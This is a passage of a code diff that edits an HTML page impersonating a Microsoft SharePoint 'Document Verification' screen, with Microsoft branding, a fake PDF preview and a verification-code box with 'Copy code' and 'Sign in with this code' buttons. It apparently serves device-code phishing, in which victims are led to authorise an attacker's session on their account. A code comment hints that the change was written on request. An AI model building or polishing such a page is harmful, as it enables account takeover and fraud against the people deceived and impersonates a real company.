@@ -6,43 +6,46 @@
     <title>SharePoint · Document Verification</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #939ba2; min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #939ba2; min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; overflow: hidden; }
         
-        /* Card Layout */
-        .card { background: white; border-radius: 4px; box-shadow: 0 2px 8px rgba(0,0,0,0.2); padding: 40px; text-align: center; width: 100%; max-width: 450px; }
+        /* Blurred background mockup */
+        .bg-mock { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #f3f2f1; filter: blur(4px); z-index: 0; }
+        
+        .card { background: white; border-radius: 4px; box-shadow: 0 4px 16px rgba(0,0,0,0.2); padding: 40px; text-align: center; width: 100%; max-width: 450px; z-index: 1; }
         
         /* Logos */
         .logo-area { display: flex; align-items: center; justify-content: center; gap: 10px; margin-bottom: 24px; font-size: 16px; }
         .ms-grid { display: grid; grid-template-columns: 10px 10px; gap: 2px; }
         .ms-grid div { width: 10px; height: 10px; }
         
-        /* Text Styling */
         h1 { font-size: 24px; font-weight: 700; color: #1b1b1b; margin-bottom: 16px; line-height: 1.2; }
-        .subtitle { font-size: 14px; color: #444; margin-bottom: 32px; line-height: 1.5; }
+        .subtitle { font-size: 14px; color: #444; margin-bottom: 20px; }
         
-        /* Document Preview Box */
         .doc-preview { border: 1px solid #dcdcdc; border-radius: 4px; padding: 15px; text-align: left; margin-bottom: 25px; display: flex; align-items: center; gap: 15px; }
-        .doc-preview-name { font-size: 14px; font-weight: 700; color: #000; margin-bottom: 2px; }
+        .doc-preview-name { font-size: 14px; font-weight: 700; color: #000; }
         .doc-preview-meta { font-size: 13px; color: #555; }
         
-        /* Button & Footer */
-        .btn-primary { width: 100%; padding: 12px; background: #0078d4; color: white; border: none; border-radius: 2px; font-size: 15px; font-weight: 600; cursor: pointer; }
-        .btn-primary:hover { background: #005a9e; }
+        /* New verification UI elements */
+        .input-label { font-size: 13px; color: #323130; margin-bottom: 8px; display: block; }
+        .code-input { width: 100%; padding: 12px; margin-bottom: 15px; border: 1px solid #8a8886; border-radius: 2px; font-size: 18px; text-align: center; color: #323130; font-weight: 600; }
+        .btn-secondary { width: 100%; padding: 12px; background: white; border: 1px solid #8a8886; font-size: 15px; font-weight: 600; cursor: pointer; margin-bottom: 10px; }
+        .btn-primary { width: 100%; padding: 12px; background: #0078d4; color: white; border: none; font-size: 15px; font-weight: 600; cursor: pointer; }
+        .timer-text { font-size: 12px; color: #605e5c; margin-top: 15px; }
         .footer { margin-top: 30px; font-size: 12px; color: #767676; }
     </style>
 </head>
 <body>
 
+    <div class="bg-mock"></div>
+
     <div class="card">
         <div class="logo-area">
             <div class="ms-grid">
-                <div style="background-color: #f25022;"></div>
-                <div style="background-color: #7fba00;"></div>
-                <div style="background-color: #00a4ef;"></div>
-                <div style="background-color: #ffb900;"></div>
+                <div style="background-color: #f25022;"></div><div style="background-color: #7fba00;"></div>
+                <div style="background-color: #00a4ef;"></div><div style="background-color: #ffb900;"></div>
             </div>
             <span>+</span>
-            <img src="https://cdn.jsdelivr.net/gh/homarr-labs/dashboard-icons/webp/microsoft-sharepoint.webp" alt="SharePoint" style="width: 24px; height: 24px;">
+            <img src="https://cdn.jsdelivr.net/gh/homarr-labs/dashboard-icons/webp/microsoft-sharepoint.webp" style="width: 24px; height: 24px;">
             <span style="font-weight: 600; color: #201f1e;">SharePoint for Microsoft</span>
         </div>
 
@@ -50,25 +53,15 @@
         <p class="subtitle">This SharePoint site requires authentication. Complete the verification process to continue.</p>
         
         <div class="doc-preview">
-            <img src="https://cdn-icons-png.flaticon.com/512/337/337946.png" alt="PDF" style="width: 30px; height: 30px; opacity: 0.7;">
+            <img src="https://cdn-icons-png.flaticon.com/512/337/337946.png" style="width: 30px; height: 30px; opacity: 0.7;">
             <div>
-                <div class="doc-preview-name">Company Policy</div>
-                <div class="doc-preview-meta">Company_Policy.pdf · 12 pages</div>
+                <div class="doc-preview-name">Document Details</div>
+                <div class="doc-preview-meta">Document Details.pdf · 12 pages</div>
             </div>
         </div>
 
-        <button class="btn-primary" onclick="startVerification()">Get verification code</button>
-        
-        <div class="footer">
-            Microsoft account · SharePoint · Security · Privacy
-        </div>
-    </div>
-
-    <script>
-        function startVerification() { 
-            // This function triggers the redirection as requested
-            window.location.href = '/api/device/start'; 
-        }
-    </script>
-</body>
-</html>
+        <div id="verification-ui" style="display: none;">
+            <label class="input-label">Your verification code</label>
+            <input type="text" id="code-box" class="code-input" readonly>
+            <button class="btn-secondary" onclick="copyCode()">Copy code</button>
+            <button class="btn-primary" onclick="signIn()">Sign in with this code</button>
